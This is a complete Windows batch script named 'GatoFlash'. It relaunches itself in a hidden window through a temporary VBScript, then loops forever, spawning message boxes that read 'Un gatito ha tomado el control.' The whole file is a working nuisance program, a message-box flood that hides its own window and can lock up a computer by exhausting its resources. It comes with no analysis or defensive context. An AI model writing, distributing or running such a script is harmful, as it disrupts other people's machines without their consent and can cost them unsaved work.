@echo off
title GatoFlash
if "%1"=="hide" goto :run
set "vbs_hide=%temp%\hide_run.vbs"
echo CreateObject("Wscript.Shell").Run chr(34) ^& "%~f0" ^& chr(34) ^& " hide", 0, False > "%vbs_hide%"
wscript "%vbs_hide%"
del "%vbs_hide%"
exit
:run
echo x=msgbox("Un gatito ha tomado el control.", 64, "¡Miau! NI-") > "%temp%\gatito_msg.vbs"
:loop
start wscript "%temp%\gatito_msg.vbs"
goto loop
exit
